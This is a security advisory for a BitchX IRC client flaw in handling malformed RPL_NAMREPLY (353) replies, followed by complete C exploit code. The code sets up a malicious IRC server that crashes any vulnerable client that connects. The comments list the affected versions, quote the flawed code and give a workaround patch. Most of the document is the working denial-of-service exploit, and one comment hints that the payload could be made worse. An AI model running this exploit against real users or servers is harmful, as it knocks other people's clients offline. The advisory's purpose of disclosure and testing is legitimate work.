source: http://www.securityfocus.com/bid/6880/info

It has been reported that BitchX does not properly handle some types of replies contained in the RPL_NAMREPLY numeric. When a malformed reply is received by the client, the client crashes, resulting in a denial of service. 

/*
 * bitchx-353.c
 * --argv
 * Jan/30/03
 *
 * Vulnerable:
 *      BitchX-75p3
 *      BitchX-1.0c16
 *      BitchX-1.0c19
 *      BitchX-1.0c20cvs
 *
 * Not Vulnerable:
 *      BitchX-1.0c18   (So far..)
 *
 *
 *  Workaround:
 *      in function funny_namreply()
 *      after the PasteArgs(Args, 2);
 *      add in
 *      -- snip --
 *      if (Args[1] == NULL || Args[2] == NULL)
 *                      return;
 *      -- unsnip --
 *
 * ---- the vuln code of bx -----
 *       PasteArgs(Args, 2);
 *       type = Args[0];
 *       channel = Args[1];
 *       line = Args[2];
 *
 *       ptr = line;
 *       while (*ptr)
 *       {
 *               while (*ptr && (*ptr != ' '))
 *                       ptr++;
 *               user_count++;
 *               while (*ptr && (*ptr == ' '))
 *                       ptr++;
 *       }
 * ------------------------------
 *
 * [panasync(panasync@colossus.melnibone.org)] you would hope the irc server would be a trusted source.
 * [hellman(hellman@ipv6.gi-1.au.reroute.se)] 'Free porn at /server irc.owned.com'
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

static char shellcode[] = ":* 353 * =  :\n";    // <-- this could be something worse.

int acceptConnection(int fd)
{
   char *ip_addr;
   int descriptor, sal;
   struct sockaddr_in sa;
   sal = sizeof(sa);
   descriptor = accept(fd, (struct sockaddr *) &sa, &sal);
   if (descriptor >= 0) {
      ip_addr = inet_ntoa(sa.sin_addr);
      printf("Connection from %s:%d\n", ip_addr, ntohs(sa.sin_port));
   }
   return descriptor;
}


int main(int argc, char **argv)
{
   int sock, serv, port;
   struct sockaddr_in server;

   port = 6667;

   if (argc > 1)
        port = atoi(argv[1]);

   memset(&server, 0, sizeof(server));
   server.sin_port = htons(port);
   server.sin_family = AF_INET;
   server.sin_addr.s_addr = INADDR_ANY;

   sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
   setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &serv, sizeof(int));

   if (bind(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_in))
       == -1) {
      return 0;
   }

   listen(sock, 1);

   while (1) {
      serv = acceptConnection(sock);
      write(serv, shellcode, strlen(shellcode));
      close(serv);
   }
   return 0;
}